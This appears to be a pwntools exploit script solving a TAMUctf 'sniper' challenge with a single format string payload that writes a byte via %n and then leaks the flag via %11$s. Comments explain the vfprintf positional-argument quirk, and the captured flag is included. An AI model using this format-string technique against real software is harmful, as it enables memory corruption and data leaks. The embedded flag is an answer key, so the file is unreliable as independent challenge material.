from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./sniper_patched', '''
    b *(vuln+98)
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")

# this is a special case of format string exploit
# there is only one payload that must achieve both data writing first and then data reading, which is read in by fgets, leaving one and only '\n' byte ('\x0a') in the end of the payload
# the address of 0xa0a0000, where a flag string should be leaked out by printf; the last byte of 0xa0a0000, where a '\n' byte ('\x0a') should be written to stack by printf
# when vfprintf encounters first positional parameter $, it copies all needed data to an internal buffer, fetch original value instead of changed value, leading to data writing not been performed yet when data leaking
# so the correct complete payload must be no dollars
# fmtstr_payload function can be used to inspect the correct payload for data writing without dollars, then combine it with the correct payload for data leaking with dollars to format a complete format string payload

input_buffer_addr = int(p.recvline().strip().decode(), 16)
log.info(f"input buffer address: {hex(input_buffer_addr)}")
p.sendline(b'%c'*9+b'c%n%11$s'+b'\x00'*6+p64(input_buffer_addr+43)+b'\x00\x00')

p.interactive()

# https://blog.redrocket.club/2020/12/23/HXPCTF-Still_Printf/
# gigem{you_know_what_maybe_i_should_just_leave_naming_up_to_rng_via_http://ternus.github.io/nsaproductgenerator/}